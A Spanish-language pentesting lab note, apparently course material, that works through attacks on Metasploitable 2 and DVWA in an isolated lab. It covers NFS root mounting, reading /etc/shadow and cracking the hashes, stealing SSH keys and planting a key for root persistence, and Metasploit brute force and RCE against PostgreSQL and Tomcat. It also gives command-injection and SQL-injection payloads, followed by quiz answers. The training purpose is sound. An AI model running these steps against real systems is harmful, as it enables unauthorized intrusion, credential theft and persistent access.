
> [!info] Relacionado con
> [[Explotación de Servicios - Linux]] · [[Explotación de Servicios - Windows]] · [[Escalada de Privilegios]] · [[Fuzzing Web con ffuf]]

---

## ⚠️ Recordatorio de laboratorio

Metasploitable 2 en red aislada. Kali como atacante, Metasploitable como víctima.

---

## ① NFS — Repaso y montaje

NFS (Network File System) permite compartir carpetas Linux por red. Puerto **2049**.

### Flujo completo

```bash
# 1. Confirmar que NFS está activo
rpcinfo -p <IP> # busca "nfs" en la lista

# 2. Ver carpetas compartidas
showmount -e <IP>
# Resultado: / * → raíz completa accesible desde cualquier IP

# 3. Crear carpeta local y montar
mkdir ~/Desktop/carpeta_meta2
sudo mount -t nfs <IP>:/ ~/Desktop/carpeta_meta2
# IMPORTANTE: IP:carpeta_compartida (dos puntos + barra)
# Usar sudo si da error de permisos

# 4. Explorar el sistema montado
ls ~/Desktop/carpeta_meta2
sudo cat ~/Desktop/carpeta_meta2/etc/shadow # hashes
cat ~/Desktop/carpeta_meta2/etc/passwd # usuarios
```

> [!danger] PELIGRO
> Compartir `/` desde la raíz expone **todo** el sistema de ficheros. Cualquier atacante en la misma red puede leer `/etc/shadow`, claves SSH y modificar `authorized_keys`.

---

## ② Hashes — /etc/shadow, John y Hashcat

Una vez montada la raíz por NFS, `/etc/shadow` contiene los hashes de todos los usuarios.

### Identificar tipo de hash

```bash
hash-identifier # pegar el hash → te dice el tipo
```

| Prefijo | Tipo | Hashcat modo |
|---------|------|-------------|
| `$1$` | MD5crypt | 500 |
| `$5$` | SHA-256 | 7400 |
| `$6$` | SHA-512 | 1800 |
| `*` | Cuenta deshabilitada | — |
| `!` | Cuenta bloqueada | — |

### Romper con John

```bash
# Copiar las líneas de /etc/shadow a hashes.txt
nano hashes.txt
# Formato: usuario:$1$...:...:... (copia todo tal cual)

# Romper (MD5crypt)
john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Ver resultados
john --show hashes.txt

# Progreso
john --status
```

> [!warning] JOHN NO REPITE
> Si lanzas el mismo comando dos veces no muestra nada nuevo. Usa `john --show hashes.txt` para consultar los ya rotos.

### Romper con Hashcat

```bash
# MD5crypt (modo 500)
hashcat -m 500 hashes.txt /usr/share/wordlists/rockyou.txt

# SHA-512 (modo 1800)
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt

# Ver resultados
hashcat -m 500 hashes.txt --show
```

| Herramienta | Cuándo usar |
|-------------|------------|
| **[[John_Hashcat\|John]]** | Más sencillo, detecta formato automáticamente. Labs. |
| **[[John_Hashcat\|Hashcat]]** | Usa GPU → mucho más rápido. Entornos reales. |

> [!tip] PRÁCTICA
> Contraseñas rotas en esta sesión: `sys → batman` · `klog → 123456789` · `service → service`.

---

## ③ SSH por NFS — Robar y crear claves

Al tener montada la raíz con permisos de lectura y escritura, tenemos dos vectores.

### Ficheros clave

| Fichero | Función |
|---------|---------|
| `~/.ssh/id_rsa` | **Clave PRIVADA** — la que se roba o genera. Nunca compartir. |
| `~/.ssh/id_rsa.pub` | **Clave PÚBLICA** — la que se deja en el servidor. |
| `~/.ssh/authorized_keys` | Lista de claves públicas autorizadas a conectarse sin contraseña. |

### Vector 1 — Robar la clave privada existente

```bash
# Explorar el .ssh del usuario msfadmin vía NFS
ls -la ~/Desktop/carpeta_meta2/home/msfadmin/.ssh/

# Comprobar quién está autorizado en root
cat ~/Desktop/carpeta_meta2/root/.ssh/authorized_keys
# → La clave pública de msfadmin también está en root

# Copiar la clave privada
cp ~/Desktop/carpeta_meta2/home/msfadmin/.ssh/id_rsa ~/Desktop/id_rsa_robada

# Dar permisos (OBLIGATORIO)
chmod 600 ~/Desktop/id_rsa_robada

# Conectarse como root
ssh -i ~/Desktop/id_rsa_robada root@<IP>
whoami # → root
```

> [!important] POR QUÉ FUNCIONA CON ROOT
> La clave privada de msfadmin estaba protegida con passphrase para ese usuario. Sin embargo, esa misma clave pública estaba en `authorized_keys` de root sin protección → entramos como root.

### Vector 2 — Crear nuestra propia clave (persistencia)

```bash
# 1. Generar un par de claves SSH en Kali
ssh-keygen -t rsa -f ~/Desktop/mi_clave_nueva
# Passphrase: Enter (vacío, obligatorio para automatizar)

# 2. Añadir la clave pública al authorized_keys de root en la víctima
# USAR >> (añadir), NUNCA > (sobreescribe y rompe accesos)
cat ~/Desktop/mi_clave_nueva.pub >> ~/Desktop/carpeta_meta2/root/.ssh/authorized_keys

# 3. Verificar
cat ~/Desktop/carpeta_meta2/root/.ssh/authorized_keys
# → Ahora hay N+1 claves autorizadas

# 4. Conectarse con la nueva clave privada
chmod 600 ~/Desktop/mi_clave_nueva
ssh -i ~/Desktop/mi_clave_nueva root@<IP>
whoami # → root
```

> [!warning] PERSISTENCIA >> vs >
> `>>` añade al final del fichero (no destruye el acceso existente). `>` sobreescribe y elimina todas las claves anteriores. En persistencia **siempre usar `>>`**.

> [!tip] RECUERDA
> Los cambios en la carpeta montada por NFS se aplican directamente en el sistema remoto en tiempo real. No es una copia local.

---

## ④ PostgreSQL — Fuerza bruta y explotación

Puerto **5432**. La versión de Metasploitable 2 es muy antigua y vulnerable.

### Fuerza bruta con Metasploit

```bash
msfconsole
search postgres login
use auxiliary/scanner/postgres/postgres_login
show options
set RHOSTS <IP>
run
# Resultado: postgres:postgres (credenciales por defecto)
```

### Descarga de diccionarios desde SecLists

```bash
# Instalar SecLists (si no está)
sudo git clone https://github.com/danielmiessler/SecLists /usr/share/seclists

# Descargar diccionario específico (usuarios)
# Navegar a GitHub → SecLists → Usernames → botón "Raw"
wget <url_raw> -O usuarios.txt

# Ver tamaño
wc -l usuarios.txt
```

### Exploit autenticado (RCE)

```bash
search postgres
# Elegir exploit/multi/postgres/postgres_copy_from_program_cmd_exec (Linux)
use 0
show options
set RHOSTS <IP>
set USERNAME postgres
set PASSWORD postgres
run
# → Meterpreter shell como usuario "postgres"

shell
whoami # → postgres
sudo -l # → sin privilegios de root
```

> [!info] CUENTAS DE SERVICIO
> Al explotar PostgreSQL obtienes una shell como usuario `postgres`. Al explotar Apache/cgbin obtienes `www-data`. Cada servicio corre con su propio usuario de bajo privilegio. Desde ahí habría que escalar a root.

---

## ⑤ Apache Tomcat — Reconocimiento y explotación

Apache Tomcat corre en el puerto **8180** en Metasploitable 2. Contenedor de servlets Java (JSP/servlets). Acceso en: `http://<IP>:8180`

### Reconocimiento con Metasploit

```bash
search tomcat
use auxiliary/scanner/http/tomcat_mgr_login
show options
set RHOSTS <IP>
set RPORT 8180
run
# → Credenciales encontradas: tomcat:tomcat

# También disponible: auxiliary/admin/http/tomcat_administration
# → Extrae usuarios, roles, ficheros XML de configuración
```

### Exploit autenticado — Subida de WAR

```bash
search tomcat mgr
use exploit/multi/http/tomcat_mgr_upload
show options
set RHOSTS <IP>
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
run
# → Meterpreter como usuario "tomcat55"

shell
whoami # → tomcat55
sudo -l # verificar privilegios
```

> [!warning] VULNERABILIDAD AUTENTICADA
> Esta vulnerabilidad **requiere credenciales válidas**. Sin usuario/contraseña no se puede explotar. Por eso el paso de fuerza bruta previo es necesario.

---

## ⑥ MySQL — Credenciales en robots.txt

Puerto **3306**. En Metasploitable 2, el fichero `config.inc.php` encontrado a través de `robots.txt` expone credenciales en texto claro.

### Obtener credenciales desde robots.txt

```bash
# Navegar a: http://<IP>/robots.txt
# → Lista de rutas que el propietario no quiere indexar
# Buscar: /config.inc.php /passwords/ /twiki/ etc.

# Acceder a: http://<IP>/config.inc.php
# → dbhost: localhost
# → dbuser: root
# → dbpass: (vacío)
```

### Conectarse a MySQL

```bash
mysql -h <IP> -u root -p
# Contraseña: Enter (vacío)

show databases;
use dvwa;
show tables;
select * from users;
# Los hashes de la tabla users se pueden romper con John/Hashcat
```

> [!tip] ROBOTS.TXT
> `robots.txt` indica a los buscadores qué NO indexar. Para un pentester: directorios privados, paneles de administración y ficheros de configuración. Siempre uno de los primeros ficheros a revisar.

---

## ⑦ Feroxbuster — Fuzzing recursivo

[[Feroxbuster]] es una herramienta de fuzzing web que, a diferencia de [[FFUF|ffuf]]/dirb, busca subdirectorios de forma **recursiva**. Encuentra rutas dentro de rutas.

```bash
# Instalación
sudo apt install feroxbuster -y

# Uso básico (fuzzing recursivo)
feroxbuster --url http://<IP>/

# Con diccionario específico
feroxbuster --url http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Solo ver códigos 200
feroxbuster --url http://<IP>/ --status-codes 200
```

| Herramienta | Diferencia principal |
|-------------|---------------------|
| [[FFUF\|ffuf]] | Rápido, muy flexible, no recursivo por defecto. Ideal para un nivel. |
| **[[Feroxbuster]]** | Recursivo de forma nativa. Encuentra sub-subdirectorios automáticamente. |
| dirb | Legacy. Más lento. Útil con diccionarios pequeños. |

> [!warning] NOTA
> Los ficheros dentro de `robots.txt` normalmente no se encuentran con fuzzing (no están en diccionarios). `robots.txt` se lee manualmente. Feroxbuster sirve para descubrir rutas que NO están en `robots.txt`.

---

## ⑧ Command Injection — Introducción (DVWA)

En DVWA (Damn Vulnerable Web App), la sección "Command Execution" permite enviar una IP y la página hace un ping. Si la entrada no está correctamente sanitizada se pueden inyectar comandos.

### Técnica básica — separadores de comandos

```bash
# La aplicación hace internamente: ping -c1 <INPUT>

# Inyección con punto y coma (ejecuta siempre ambos):
127.0.0.1; whoami

# Inyección con AND (ejecuta solo si ping tiene éxito):
127.0.0.1 && cat /etc/passwd

# Inyección con pipe (stdout → stdin):
127.0.0.1 | id

# Inyección con OR (ejecuta segundo si primero falla):
127.0.0.1 || id
```

| Separador | Comportamiento |
|-----------|---------------|
| `;` | Ejecuta siempre ambos |
| `&&` | Ejecuta segundo si primero tiene éxito |
| `\|` | Pipe: stdout → stdin |
| `\|\|` | Ejecuta segundo si primero falla |

### Command Execution vs RCE

| Término | Descripción |
|---------|-------------|
| **Command Execution (local)** | El servidor ejecuta el comando desde su propia IP |
| **RCE — Remote Code Execution** | El atacante ejecuta código en el servidor desde una máquina remota (implica reverse shell) |

> [!danger] OWASP TOP 10
> La validación insuficiente de inputs que se pasan a funciones del SO (`exec`, `system`, `popen`...) es uno de los vectores más peligrosos. OWASP lo incluye como "Injection".

---

## ⑨ SQL Injection — Primer contacto (DVWA)

En DVWA, la sección de búsqueda de usuarios ejecuta una consulta SQL con el input del usuario. Si no está sanitizado → se puede manipular.

### Técnica básica

```bash
# Test básico: poner una comilla simple en el input
# Si salta un error MySQL → posible SQLi

# Payload clásico para bypassear login:
' OR '1'='1

# Extraer datos con UNION (si el tipo es visible):
1' UNION SELECT user,password FROM users-- -

# Preparar DVWA para practicar SQLi:
# 1. Navegar a: http://<IP>/dvwa/setup.php
# 2. Login: admin / password
# 3. Click en 'Create / Reset Database'
# 4. Security Level: Low
```

> [!tip] PRÓXIMAS SESIONES
> SQL Injection y XSS se verán en profundidad en el módulo web. Esta sesión solo es una introducción visual en DVWA. Los tipos (error-based, blind, time-based, UNION) se cubrirán después.

---

## ⑩ Resumen: vectores de esta sesión

| Puerto / Servicio | Vector y acceso obtenido |
|-------------------|-------------------------|
| 2049 — NFS | Montar `/` con `mount -t nfs` → sistema de ficheros completo |
| 2049 — NFS | Leer `/etc/shadow` → hashes → John/Hashcat → contraseñas en claro |
| 2049 — NFS | Robar `id_rsa` + `chmod 600` + `ssh -i` → root por SSH |
| 2049 — NFS | Añadir clave pública propia a `authorized_keys` → persistencia como root |
| 5432 — PostgreSQL | Fuerza bruta Metasploit → `postgres:postgres` → exploit → shell usuario postgres |
| 8180 — Apache Tomcat | Recon auxiliar → fuerza bruta → `tomcat:tomcat` → upload WAR → shell usuario tomcat55 |
| 3306 — MySQL | `robots.txt` → `config.inc.php` → root sin contraseña → acceso a bases de datos |
| 80 — HTTP (DVWA) | Command Injection con `; && \|` → ejecución de comandos en el servidor |
| 80 — HTTP (DVWA) | SQL Injection con comilla → error MySQL → extracción de datos |

---

## ⑪ Preguntas de laboratorio

### NFS y SSH

1. ¿Cuál es la diferencia entre `showmount -e` y `mount`? ¿En qué orden se usan?
2. Tienes montada la raíz en `~/Desktop/carpeta`. ¿Cómo lees el `/etc/shadow` de la víctima?
3. ¿Por qué hay que usar `>>` y nunca `>` al añadir una clave pública a `authorized_keys`?
4. ¿Qué permiso hay que dar a una clave privada antes de usarla con SSH? ¿Qué pasa si no lo haces?
5. La clave privada de msfadmin no te permite conectarte como msfadmin, pero sí como root. ¿Por qué?

### Hashes

6. Un hash comienza por `$6$`. ¿Qué tipo es? ¿Qué modo usas en Hashcat?
7. ¿Qué significa que una línea de `/etc/shadow` empiece por `*` o `!`?
8. John no muestra resultados si relanzas el mismo comando. ¿Cómo ves los ya rotos?

### Web

9. ¿Para qué sirve `robots.txt`? ¿Por qué es interesante para un pentester?
10. ¿Qué diferencia hay entre Command Execution local y Remote Code Execution?
11. ¿Qué separadores puedes usar para inyectar un comando adicional en un formulario de ping?
12. ¿Qué usuario obtienes normalmente al comprometer un servicio web (Apache) y cuál es el siguiente paso?

### Respuestas

1. `showmount -e` lista lo compartido; `mount` lo monta localmente. Primero `showmount`, luego `mount`.
2. `sudo cat ~/Desktop/carpeta/etc/shadow`
3. `>>` añade al final; `>` sobreescribe y destruye los accesos existentes. `>>` es imprescindible para no romper el acceso legítimo.
4. `chmod 600`. SSH rechaza la clave con el error "Permissions are too open" si no se hace.
5. La clave privada de msfadmin estaba protegida con passphrase para ese usuario. La misma clave pública estaba en `authorized_keys` de root sin protección adicional.
6. SHA-512. Modo 1800: `hashcat -m 1800 hashes.txt diccionario.txt`
7. La cuenta existe pero está **deshabilitada**; el usuario no puede autenticarse.
8. `john --show hashes.txt`
9. `robots.txt` indica a los buscadores qué no indexar. Para un pentester: directorios privados, paneles de admin y ficheros de configuración.
10. Command Execution local: el servidor ejecuta el comando desde su propia IP. RCE: el atacante ejecuta código en el servidor desde una máquina remota (implica reverse shell).
11. `;` (punto y coma) · `&&` (AND) · `|` (pipe) · `||` (OR).
12. `www-data`. Siguiente paso: buscar escalada de privilegios con `sudo -l`, ficheros SUID, credenciales expuestas.

---

## ⑫ Checklist de repaso

- [ ] ¿Sé montar un sistema NFS y explorarlo?
- [ ] ¿Puedo romper hashes con [[John_Hashcat|John]] y [[John_Hashcat|Hashcat]]?
- [ ] ¿Sé robar/crear claves SSH para persistencia?
- [ ] ¿Entiendo la diferencia entre `>>` y `>`?
- [ ] ¿Sé explotar PostgreSQL con Metasploit (fuerza bruta + exploit)?
- [ ] ¿Sé reconecer Apache Tomcat, fuerza bruta y subir un WAR?
- [ ] ¿Sé encontrar credenciales de MySQL en `robots.txt` / `config.inc.php`?
- [ ] ¿Uso Feroxbuster para fuzzing recursivo?
- [ ] ¿Reconozco un Command Injection y sé explotarlo con los 4 separadores?
- [ ] ¿Reconozco un SQL Injection y sé extraer datos con UNION SELECT?